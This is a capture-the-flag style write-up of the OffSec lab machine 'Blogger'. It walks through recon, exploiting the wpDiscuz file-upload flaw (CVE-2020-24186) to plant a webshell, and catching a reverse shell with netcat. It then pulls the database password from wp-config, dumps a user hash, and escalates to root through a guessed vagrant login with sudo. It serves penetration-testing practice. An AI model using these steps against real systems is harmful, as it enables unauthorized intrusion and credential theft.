---
layout: post
category: writeup
---

## Machine Info

- Name: Blogger
- Description: The Blog of War
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Blogger | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Instantly I start a dirsearch:
```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://192.168.154.217

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/192.168.154.217/_24-01-30_10-53-05.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-30_10-53-05.log

Target: http://192.168.154.217/

[10:53:05] Starting: 
[10:53:05] 200 -    5KB - /images/
[10:53:06] 403 -  280B  - /icons/
[10:53:07] 200 -   45KB - /index.html
[10:53:09] 301 -  319B  - /images  ->  http://192.168.154.217/images/
[10:53:10] 301 -  319B  - /assets  ->  http://192.168.154.217/assets/
[10:53:10] 200 -    1KB - /assets/
[10:53:12] 200 -    2KB - /css/
[10:53:12] 301 -  316B  - /css  ->  http://192.168.154.217/css/
[10:53:15] 301 -  315B  - /js  ->  http://192.168.154.217/js/
[10:53:15] 200 -    3KB - /js/
```

Looking through the directories I come across blog:

![](assets/images/2024-01-30-offsec-blogger-writeup-image-1.png)

In it I see a wordpress site, and it has a domain host associated with it:

![](assets/images/2024-01-30-offsec-blogger-writeup-image-2.png)

Looking through the upload directory, I see a reverse shell payload:

![](assets/images/2024-01-30-offsec-blogger-writeup-image-3.png)

This tells me this site has been hacked before me. Let's see if we can mimic the attack!

I ran wordpress scan with aggressive plugin detection:
```bash
wpscan --url http://192.168.154.217/assets/fonts/blog/ -e dbe,cb,vt,ap,u --plugins-detection aggressive
```

Eventually I find an outdated plugin `wpdiscuz`

I run a script that will exploit it and upload a reverse shell:
```bash
offsec python3 49967.py -u http://192.168.154.217/assets/fonts/blog -p '/?p=29'   
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[59453] | code:[200]
[!] Got wmuSecurity value: 23a7103f5b
[!] Got wmuSecurity value: 29 

[+] Generating random name for Webshell...
[!] Generated webshell name: xeynmywwrikutnk

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2024/01/xeynmywwrikutnk-1706631153.415.php&quot; 

> whoami

[x] Failed to execute PHP code...
```

However it says it didn't work, looking at the script I can see some syntax issues, I route manually to the directory on the webpage and find the file and get command execution:

![](assets/images/2024-01-30-offsec-blogger-writeup-image-4.png)

I catch a rev shell afterwards!

```bash
offsec nc -nvlp 443
listening on [any] 443 ...                                                                                                                                     
connect to [192.168.45.222] from (UNKNOWN) [192.168.154.217] 42160                                                                                             
bash: cannot set terminal process group (1386): Inappropriate ioctl for device
bash: no job control in this shell                                             
<ress/assets/fonts/blog/wp-content/uploads/2024/01$ whoami                     
whoami          
www-data
```
## Privilege Escalation

I start by enumerating the config file for wordpress for creds:
```php
define('DB_NAME', 'wordpress');                                                
                                                                               
/** MySQL database username */       
define('DB_USER', 'root');
                                                                               
/** MySQL database password */
define('DB_PASSWORD', 'sup3r_s3cr3t');
                                                                               
/** MySQL hostname */
define('DB_HOST', 'localhost');
```

I login to mysql:
```sql
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 22230
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```sql
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm |          | 2021-01-17 12:40:06 |                     |           0 | j@m3s        |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

MariaDB [wordpress]> 
```

I see the password is encrypted for jm3s, let's see if we can crack it!

Unfortunately it was not cracked, however, I did find this backup.sh script while I was doing my enumeration:

I see that there are 3 users on the box, I guess the login of vagrant:vagrant on the vagrant account and get access, checking sudo privs I can see I have nopasswd ALL:
```bash
vagrant@ubuntu-xenial:/$ sudo -l
sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
```

```
vagrant@ubuntu-xenial:/$ sudo su 
sudo su 
root@ubuntu-xenial:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

best,
gerbsec